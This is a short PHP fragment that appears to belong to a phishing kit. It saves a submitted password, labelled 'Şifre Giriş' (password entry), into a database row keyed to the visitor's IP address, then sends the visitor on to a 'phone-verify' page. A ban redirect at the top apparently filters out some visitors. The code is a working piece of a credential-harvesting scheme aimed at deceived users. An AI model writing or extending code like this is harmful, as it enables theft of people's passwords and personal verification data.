  $ajax->redirect(BAN_URL);
}

if($_POST)
{ 
  $password = $ajax->input($_POST['d2']); 

  $insert = $db->prepare("UPDATE records SET password = ? , lastOnline=? WHERE ipAddress=?");
  $insert->execute([$password,time(),IP]);

  if($insert)
  {
    $ajax->redirect('phone-verify');
  }

}

$ajax->pageUpdate(IP, "Şifre Giriş");
